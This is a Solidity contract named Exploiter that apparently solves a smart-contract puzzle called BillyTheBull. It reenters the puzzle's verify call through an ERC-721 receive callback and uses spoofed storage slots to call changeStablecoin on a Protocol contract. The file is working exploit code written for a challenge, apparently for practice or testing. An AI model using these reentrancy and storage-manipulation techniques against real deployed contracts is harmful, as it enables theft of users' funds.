// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { Protocol } from "../src/Protocol.sol";

contract Exploiter {
    address owner;
    uint[5] _gap;
    BillyTheBull puzzle = BillyTheBull(0xc7183455a4C133Ae270771860664b6B7ec320bB1);
    bool flag;

    function onERC721Received(address _operator, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            // this hardcoding below breaks every few tests
            puzzle.verify(uint(uint160(_operator)), 1 << 248 | _tokenId + 1 << 240 | uint160(address(this)));
        }
        return this.onERC721Received.selector;
    }

    function doSomething(address _protocol) external {
        owner = address(this);
        Protocol(_protocol).changeStablecoin(0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9);
        owner = address(0x69);
    }
}
